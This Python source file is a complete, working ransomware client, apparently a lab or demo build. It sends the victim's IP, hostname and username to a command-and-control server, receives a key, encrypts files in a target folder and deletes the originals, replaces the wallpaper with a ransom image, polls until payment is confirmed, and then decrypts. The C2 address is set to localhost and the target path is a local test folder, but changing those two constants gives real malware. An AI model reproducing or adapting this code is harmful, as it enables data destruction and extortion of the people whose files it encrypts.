# coding: utf-8

import httpx  # Handling HTTP request/responses
import nacl.secret
import datetime  # Handling time-related data
import os, sys  # For system-related data handling (hostname/usernames)
import base64, pathlib
import ctypes
from time import sleep

# Debug variables
c2_url = "http://localhost:5000"
target_paths = [".\\toencrypt"]
exclude_types = (".exe", ".dll", ".img")


class Ransomware:
    """This object implements the core function and variables for the Ransomware"""

    def __init__(self):
        # Get Public IP as one of the identification indicators
        self.public_ip = self.get_public_ip()

        # Get current date to estimate when contact was established
        self.firstContact = datetime.datetime.now()

        # Get hostname/username as another identification indicator
        self.hostname, self.username = self.get_system_info()

        # Data which will be received by C2 server later on
        self.encryption_key = None
        self.victim_id = None

        # Our "safe" used to encrypt/decrypt data
        self.box = None

    def __str__(self):
        return f"IP: {self.public_ip}, Date: {self.firstContact}, Username: {self.username}, Hostname: {self.hostname}, Key: {self.encryption_key}, ID: {self.victim_id}"

    def get_public_ip(self):
        try:
            ip = httpx.get("https://ipconfig.io/ip", timeout=5).text.replace("\n", "")
            return ip
        except httpx.TimeoutException as err:
            print("get_public_ip(): Timeout Error --> ", err)
            return "0.0.0.0"
        except httpx.RequestError as err:
            print("get_public_ip(): Request Exception --> ", err)
            return "0.0.0.0"

    def get_system_info(self):
        try:
            hostname = os.environ["COMPUTERNAME"]
            username = os.environ["USERNAME"]
            return hostname, username
        except KeyError as err:
            print("get_system_info(): Key Error --> ", err)
            return "generic_hostname", "generic_username"
        except OSError as err:
            print("get_system_info(): OS Error --> ", err)
            return "generic_hostname", "generic_username"

    def check_for_infection(self):
        # If this variable is set, then we have been on this system before
        if os.getenv("RNSMID") is not None:
            return True
        else:
            return False
        # TODO: Add remote check with provided ID?

    def create_remote_entry(self):
        """Creates a DB entry for the new victim on the C2 server and receives keys & ID for local handling"""
        payload = {
            "username": (None, self.username),
            "hostname": (None, self.hostname),
            "ip": (None, self.public_ip),
        }
        # Send victim data via HTTP Form post to the C2 server
        try:
            response = httpx.post(f"{c2_url}/create", files=payload)
        except httpx.TimeoutException as err:
            print("create_remote_entry(): Timeout Error --> ", err)
            sleep(60)
            response = httpx.post(f"{c2_url}/create", files=payload)
        except httpx.RequestError as err:
            print("create_remote_entry(): Request Exception --> ", err)
            response = httpx.post(f"{c2_url}/create", files=payload)
        # Receive encryption key and identifier via Response headers
        self.encryption_key = response.headers["victim-key"]
        self.victim_id = response.headers["victim-id"]
        bin_key = base64.b64decode(self.encryption_key)
        self.box = nacl.secret.SecretBox(bin_key)

    def set_env_variables(self):
        os.environ["RNSMID"] = str(self.victim_id)

    def encrypt_file(self, filepath):
        """Takes a file path input and encrypts it using the box object of the Ransomware object"""
        try:
            if not os.path.isdir(filepath):
                # Take the original binary input of the file...
                with open(filepath, "rb") as original_file:
                    original_data = original_file.read()
                # ... encrypt it using the PyNaCl box provided by the parent object...
                encrypted_data = self.box.encrypt(original_data)
                # ... and write the encrypted binary data back in the same file but with an additional extension.
                with open(f"{filepath}.rnsm", "wb") as encrypted_file:
                    encrypted_file.write(encrypted_data)
                # Lastly, remove the original file.
                os.remove(filepath)
        except Exception as err:
            print("encrypt_file(): Error --> ", err)

    def start_encryption(self):
        for location in target_paths:
            try:
                # Check if each path actually exists
                if pathlib.Path(location).exists():
                    for path, subdirs, files in os.walk(location):
                        files = [fi for fi in files if not fi.endswith(exclude_types)]
                        for name in files:
                            filepath = os.path.join(path, name)
                            self.encrypt_file(filepath)
                            print(f"🔒 Encrypted: {filepath}  -->  {filepath}.rnsm")
            except Exception as err:
                print("start_encryption(): Error --> ", err)
            self.encryption_key = None
            self.box = None

    def decrypt_file(self, filepath):
        """Takes a file path input and decrypts it using the box object of the Ransomware object"""
        try:
            if not os.path.isdir(filepath):
                # Take the encrypted binary input of the file...
                with open(filepath, "rb") as encrypted_file:
                    encrypted_data = encrypted_file.read()
                # ... decrypt it using the PyNaCl box provided by the parent object...
                original_data = self.box.decrypt(encrypted_data)
                # ... and write the original binary data back to the correct file path.
                filepath = filepath.replace(".rnsm", "")
                with open(f"{filepath}", "wb") as original_file:
                    original_file.write(original_data)
                # Lastly, remove the encrypted file.
                os.remove(f"{filepath}.rnsm")
        except Exception as err:
            print("decrypt_file(): Error --> ", err)

    def start_decryption(self):
        for location in target_paths:
            try:
                # Check if each path actually exists
                if pathlib.Path(location).exists():
                    for path, subdirs, files in os.walk(location):
                        files = [fi for fi in files if fi.endswith(".rnsm")]
                        for name in files:
                            filepath = os.path.join(path, name)
                            self.decrypt_file(filepath)
                            print(f"🔓 Decrypted: {filepath}.rnsm  -->  {filepath}")
            except Exception as err:
                print("start_decryption(): Error --> ", err)

    def change_wallpaper(self):
        "Change the victim's wallpaper to display our ransom note"
        sleep(3)
        try:
            response = httpx.get(f"{c2_url}/static/wp/{self.victim_id}.png")
        except httpx.TimeoutException as err:
            print("change_wallpaper(): Timeout Error --> ", err)
            sleep(60)
            response = httpx.get(f"{c2_url}/static/wp/{self.victim_id}.png")
        except httpx.RequestError as err:
            print("change_wallpaper(): Request Exception --> ", err)
            response = httpx.get(f"{c2_url}/static/wp/{self.victim_id}.png")
        image_path = f"C:\\Users\\{self.username}\\Desktop\\ransompaper.png"
        try:
            file = open(image_path, "wb")
            file.write(response.content)
            file.close()
            print("🖼🖼🖼 Changing wallpaper...")
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
        except FileNotFoundError as err:
            print("change_wallpaper(): FileNotFound Error --> ", err)
        except Exception as err:
            print("change_wallpaper(): Error --> ", err)

    def fear_and_loathing(self):
        self.change_wallpaper()

    def setup_decryption(self):
        """Setup the PyNaCL box again, so that decryption can take place"""
        response = httpx.post(f"{c2_url}/check/{self.victim_id}")
        self.encryption_key = response.headers["Victim-Key"]
        bin_key = base64.b64decode(self.encryption_key)
        self.box = nacl.secret.SecretBox(bin_key)


def main():
    rnsm = Ransomware()
    rnsm.create_remote_entry()
    rnsm.set_env_variables()
    rnsm.start_encryption()
    rnsm.fear_and_loathing()
    print("💲💲💲 Starting loop to check for payment receival...")
    while (
        httpx.post(f"{c2_url}/check/{rnsm.victim_id}").headers["Payment-Received"]
        == "False"
    ):
        sleep(5)
        print("😴 Syncing...")
    print("✔✔✔ Payment was received!")
    rnsm.setup_decryption()
    rnsm.start_decryption()
    print("🍾🍾🍾 You are all done, all files are now decrypted!")


if __name__ == "__main__":
    main()
